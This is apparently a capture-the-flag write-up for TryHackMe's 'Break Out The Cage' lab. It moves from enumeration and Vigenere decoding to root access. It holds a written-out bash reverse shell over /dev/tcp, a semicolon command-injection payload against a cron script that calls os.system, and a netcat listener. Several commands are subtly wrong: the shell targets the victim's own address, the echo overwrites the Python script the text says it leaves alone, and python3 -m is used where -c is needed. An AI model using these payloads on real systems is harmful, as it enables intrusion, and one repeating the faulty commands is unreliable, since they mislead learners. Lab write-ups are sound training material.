# Try Hack Me - Break Out The Cage
# Author: Atharva Bordavekar
# Difficulty: Easy
# Points:
# Vulnerabilities:

# Phase 1 - Reconnaissance:
nmap scan:
```bash
nmap -p- --min-rate=1000 <target_ip>
```
PORT   STATE SERVICE

21/tcp open  ftp

22/tcp open  ssh

80/tcp open  http

lets start enumerating the webpage at the port 80 to find out some hints or new leads. after some manual enumeration, we find nothing interesting on the website, no html comments and no robots.txt. so we carry out a gobuster directory scan which might reveal some interesting directories.

```bash
gobuster dir -u http://10.81.129.42 -w /usr/share/wordlists/dirb/common.txt
```
we get the results as follows:

/.htaccess            (Status: 403) [Size: 277]
/.hta                 (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/contracts            (Status: 301) [Size: 316] [--> http://10.81.129.42/contracts/]                                                            
/html                 (Status: 301) [Size: 311] [--> http://10.81.129.42/html/]                                                                 
/images               (Status: 301) [Size: 313] [--> http://10.81.129.42/images/]                                                               
/index.html           (Status: 200) [Size: 2453]
/scripts              (Status: 301) [Size: 314] [--> http://10.81.129.42/scripts/]                                                              
/server-status        (Status: 403) [Size: 277]

lets access the directories manually one by one. after some enumeration, none of them are of any use. lets enumerate the ftp port at port 21.

```bash
ftp <target_ip>
#when asked for username, enter anonymous
#when asked for password, press enter
```
now we can find one file named dad_tasks. lets download this file onto our attacker system to analyze it better.

```bash
get dad_tasks
```

now we see that the file contains some base64 encoded data. lets use cyber chef to decode it. after decoding the base64 encoded data, the output is still giberrish. it is probably some kind of cipher since the characters seem like they have been either shifted or replaced entirely. lets use this website !(cipher identifier)[https://www.boxentriq.com/code-breaking/cipher-identifier] to identify the type of cipher this is. turns out it is a Vigenere Cipher! lets use the Viginere Cipher decoder !(viginere_decode)[] 
since we have no idea about the KEY, we will use the automatic tool to find out the KEY. after some time we can see that the key is NAMELESSTWO


we use the manual decrypter on the same website to get the full decrypted output. 

seems like we have the answer to the question no. 1. lets see if we can access the ssh shell or not

```bash
ssh weston@<target_ip>
```
we successfully get the shell access, but it seems like there is some security feature to this shell. there are random messages which are appearing on the terminal which can disrupt our enumeration. atleast we are not getting kicked out of the shell like some king of the hill challenges, which is a great relief.

i ran linpeas.sh on the system and using pspy64, i found out that there is a script which runs as cage which takes some input from the .quotes file and then it displays that quote on the terminal. after some manual enumeration i found out that we have access to edit the file .quotes present at the location /opt/.dads_scripsts/.files/.quotes. since we have the required permissions to edit this file, we will have to understand what is actually happening when the /opt/.dads_scripts/spread_the_quotes.py is actually doing. so if we see the contents of the script we find out that it contains

```bash
#!/usr/bin/env python

#Copyright Weston 2k20 (Dad couldnt write this with all the time in the world!)
import os
import random

lines = open("/opt/.dads_scripts/.files/.quotes").read().splitlines()
quote = random.choice(lines)
os.system("wall " + quote)

```

so in layman language what this does is basically it takes one random line from the .quotes file (thanks to the .choice method) and simply uses a binary named wall and prints the quote in such a way that the wall command sends the quote to all the user terminals. if we inject our malicious commands inside the .quotes file by overwriting the entire file, the .choice method will have no choice but to fetch the only line present in the file! i did some research on DeepSeek and i found out that in order to execute command, we can type some random word and our command separated by a semi-colon. the semi colon will make sure that our command will get interpreted as an actual command instead of a quote. this si possible because of lack of sanitization in the script.

ilovenicholascage; /bin/bash

this command will become

wall ilovenicholascage; /bin/bash

this is a huge vulnerability. lets craft a reverse shell and get a shell as cage

```bash
#lets create a malicous reverseshell script inside /tmp
cat > /tmp/shell.sh <<  'EOF'
#!/bin/bash
bash -i >& /dev/tcp/<target_ip>/4444 0>&1
EOF
```
now make the script executable by all 
```bash
chmod +x shell.sh
```
now lets setup a netcat listener in another terminal
```bash
#on your attacker machine:
nc -lnvp 4444
```
now we will edit the .quotes file in such a way that we overwrite the existing file with our malicious payload

```bash
echo 'ilovenicholascage; /tmp/shell.sh' > /opt/.dads_scripts/spread_the_quotes.py
```
the single `>` will make sure that the entire file gets overwritten by our payload and only our malicious quote will run when it executes.

we wait for a minute and then we will get a shell as cage on our netcat listner. now we use this oneliner to slighly upgrade our shell

```bash
#use this one-liner to be able to use more commands in the tty
python3 -m 'import pty; pty.spawn("/bin/bash")'
```
now we find the flag1 inside the Super_Duper_Checklist file at /home/cage. now lets find out what is inside the email_backups directories.

```bash
#first navigate to the directory
cd /home/cage/email_backups
```
we find out there are three emails, upon reading all three of them we find out that in the 3rd email we find another cipher which is relatively smaller than the previous one. lets assume that this one will also be a viginere cipher since the first cipher was encoded in the same format.

```bash
#ciphertext
haiinspsyanileph
```
after using the autosolver function of the viginere_cipher decoding website we get no hits for the real KEY of the cipher. lets read the emails again for any clues. 
```bash
#email_1:
From - SeanArcher@BigManAgents.com
To - Cage@nationaltreasure.com

Hey Cage!

There's rumours of a Face/Off sequel, Face/Off 2 - Face On. It's supposedly only in the
planning stages at the moment. I've put a good word in for you, if you're lucky we 
might be able to get you a part of an angry shop keeping or something? Would you be up
for that, the money would be good and it'd look good on your acting CV.

Regards

Sean Archer

#email_2:
From - Cage@nationaltreasure.com
To - SeanArcher@BigManAgents.com

Dear Sean

We've had this discussion before Sean, I want bigger roles, I'm meant for greater things.
Why aren't you finding roles like Batman, The Little Mermaid(I'd make a great Sebastian!),
the new Home Alone film and why oh why Sean, tell me why Sean. Why did I not get a role in the
new fan made Star Wars films?! There was 3 of them! 3 Sean! I mean yes they were terrible films.
I could of made them great... great Sean.... I think you're missing my true potential.

On a much lighter note thank you for helping me set up my home server, Weston helped too, but
not overally greatly. I gave him some smaller jobs. Whats your username on here? Root?

Yours

Cage
#email_3:
From - Cage@nationaltreasure.com
To - Weston@nationaltreasure.com

Hey Son

Buddy, Sean left a note on his desk with some really strange writing on it. I quickly wrote
down what it said. Could you look into it please? I think it could be something to do with his
account on here. I want to know what he's hiding from me... I might need a new agent. Pretty
sure he's out to get me. The note said:

haiinspsyanileph

The guy also seems obsessed with my face lately. He came him wearing a mask of my face...
was rather odd. Imagine wearing his ugly face.... I wouldnt be able to FACE that!! 
hahahahahahahahahahahahahahahaahah get it Weston! FACE THAT!!!! hahahahahahahhaha
ahahahhahaha. Ahhh Face it... he's just odd. 

Regards

The Legend - Cage
```
we find a common word among the three emails which is "face". a lot of emphasis is given on this word. maybe this could be the key fot the viginere cipher. lets use the manual decrypter for getting the final output. 

BINGO!!! we get a hit with the key as "face". now this looks like a password. since there is no more higher user than cage, this must belong to root user since we find a conversation of cage mentioning Sean's username as root in the 2nd email

```bash
su root
#enter the decrypted password when prompted
```
and there we go, we have finally solved this hell of a CTF!!! Kudos to the creator of this amazing CTF. i wouldn't say that it is an Easy ctf, it definitely falls in the category of a Medium ctf considering the slick problem sovling skills requires here.

